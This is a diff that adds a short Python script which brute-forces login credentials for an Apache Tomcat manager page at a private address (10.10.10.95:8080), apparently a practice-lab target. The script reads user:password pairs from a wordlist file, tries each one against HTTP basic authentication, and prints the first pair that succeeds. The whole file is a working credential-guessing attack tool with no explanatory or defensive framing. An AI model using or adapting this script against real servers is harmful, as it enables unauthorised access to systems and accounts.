@@ -1,0 +1,13 @@
+#!/usr/bin/env python
+import sys
+import requests
+with open('pass.txt') as f:                                  #change file name to whatever password wordlist youre using
+    
+        for line in f:
+             c = line.strip('\n').split(":")
+             r = requests.get('http://10.10.10.95:8080/manager/html', auth=(c[0], c[1]))
+
+
+             if r.status_code == 200:
+                      print ("Found valid credentials \"" + line.strip('\n') + "\"")
+                      raise sys.exit()
